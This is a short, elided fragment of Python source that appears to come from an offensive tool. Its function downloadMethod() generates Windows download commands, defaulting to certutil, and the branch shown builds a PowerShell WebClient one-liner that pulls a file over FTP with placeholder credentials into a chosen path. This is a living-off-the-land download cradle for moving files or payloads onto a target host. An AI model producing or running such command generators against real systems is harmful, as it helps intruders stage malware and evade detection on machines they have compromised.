...
def downloadMethod(strMethod: str="certutil", strSource: str="", strDownloadFilepath: str="") -> list:
	...
	if strMethod in ['psftp', 'system.net.networkcredential', 'ftp', 'wlol', 'all']: arrReturn.append(f'$webClient = New-Object System.Net.WebClient; $webClient.Credentials = New-Object System.Net.NetworkCredential(\'ftpUsernameOrAnonymousLol\', \'ftpPasswordOrRemoveThisValueWithThe,\'); $webClient.DownloadFile("{strSource}", "{strDownloadFilepath}")')
